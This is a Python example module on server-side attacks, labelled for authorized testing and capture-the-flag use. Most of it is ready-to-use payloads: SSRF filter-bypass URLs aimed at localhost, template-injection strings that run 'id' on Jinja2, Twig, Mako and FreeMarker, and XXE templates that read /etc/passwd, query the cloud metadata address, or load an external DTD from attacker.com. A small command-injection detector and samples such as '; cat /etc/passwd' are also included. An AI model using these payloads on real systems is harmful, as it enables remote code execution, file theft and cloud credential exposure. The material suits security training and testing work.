"""
Example: Server-Side Attacks
==============================
SSRF filter bypass, command injection patterns, SSTI detection,
and XXE payload construction.

IMPORTANT: For authorized security testing and CTF only.
"""

from urllib.parse import quote, urlparse
from dataclasses import dataclass


# ---------------------------------------------------------------------------
# SSRF Bypass Techniques
# ---------------------------------------------------------------------------

def generate_ssrf_bypasses(target_ip: str = "127.0.0.1",
                           target_port: int = 8080) -> dict[str, str]:
    """Generate SSRF bypass payloads for common filters."""
    return {
        "decimal_ip": f"http://{int.from_bytes(bytes(map(int, target_ip.split('.'))), 'big')}:{target_port}/",
        "hex_ip": f"http://0x{target_ip.replace('.', ''):{0}>{8}}:{target_port}/".replace(
            f"0x{target_ip.replace('.', ''):{0}>{8}}",
            "0x" + "".join(f"{int(o):02x}" for o in target_ip.split("."))),
        "ipv6_mapped": f"http://[::ffff:{target_ip}]:{target_port}/",
        "url_encoded": f"http://{quote(target_ip)}:{target_port}/",
        "shortened": f"http://0:{target_port}/",
        "dns_rebind": f"http://localtest.me:{target_port}/",
    }


# ---------------------------------------------------------------------------
# Command Injection Patterns
# ---------------------------------------------------------------------------

INJECTION_CHARS = {
    ";": "Command separator (Unix)",
    "&&": "AND chain (both platforms)",
    "||": "OR chain (both platforms)",
    "|": "Pipe (both platforms)",
    "$(cmd)": "Command substitution (Unix)",
    "`cmd`": "Backtick substitution (Unix)",
    "\n": "Newline injection",
    "%0a": "URL-encoded newline",
}


def test_command_injection(user_input: str) -> dict:
    """Analyze input for command injection metacharacters."""
    dangerous_chars = [";", "&&", "||", "|", "$(", "`", "\n", "%0a"]
    found = [c for c in dangerous_chars if c in user_input]
    return {
        "input": user_input,
        "dangerous": len(found) > 0,
        "metacharacters": found,
        "safe_alternative": "Use subprocess with list args, not shell=True",
    }


# ---------------------------------------------------------------------------
# SSTI Detection Probes
# ---------------------------------------------------------------------------

SSTI_PROBES = {
    "jinja2": {"probe": "{{7*7}}", "expected": "49",
               "rce": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"},
    "twig": {"probe": "{{7*7}}", "expected": "49",
             "rce": "{{_self.env.registerUndefinedFilterCallback('system')}}"},
    "mako": {"probe": "${7*7}", "expected": "49",
             "rce": "${__import__('os').popen('id').read()}"},
    "freemarker": {"probe": "${7*7}", "expected": "49",
                   "rce": '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}'},
}


def detect_template_engine(responses: dict[str, str]) -> str:
    """Identify template engine from probe responses."""
    if responses.get("{{7*7}}") == "49":
        if responses.get("{{7*'7'}}") == "7777777":
            return "jinja2"
        return "twig"
    if responses.get("${7*7}") == "49":
        return "mako_or_freemarker"
    return "unknown"


# ---------------------------------------------------------------------------
# XXE Payload Templates
# ---------------------------------------------------------------------------

XXE_TEMPLATES = {
    "file_read": '''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>''',

    "ssrf": '''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<data>&xxe;</data>''',

    "blind_oob": '''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<data>&send;</data>''',
}


# ---------------------------------------------------------------------------
# Demo
# ---------------------------------------------------------------------------

def demo():
    print("Server-Side Attacks Examples")
    print("=" * 50)

    print("\nSSRF Bypass Payloads (target: 127.0.0.1:8080):")
    for name, payload in generate_ssrf_bypasses().items():
        print(f"  {name:20s} -> {payload}")

    print("\nCommand Injection Analysis:")
    inputs = ["8.8.8.8", "8.8.8.8; cat /etc/passwd", "$(whoami).evil.com"]
    for inp in inputs:
        result = test_command_injection(inp)
        status = "DANGEROUS" if result["dangerous"] else "safe"
        print(f"  [{status:9s}] {inp}")

    print("\nSSTI Probes by Engine:")
    for engine, data in SSTI_PROBES.items():
        print(f"  {engine:12s} probe={data['probe']}  expect={data['expected']}")

    print("\nXXE Payload (file read):")
    for line in XXE_TEMPLATES["file_read"].split("\n"):
        print(f"  {line}")


if __name__ == "__main__":
    demo()
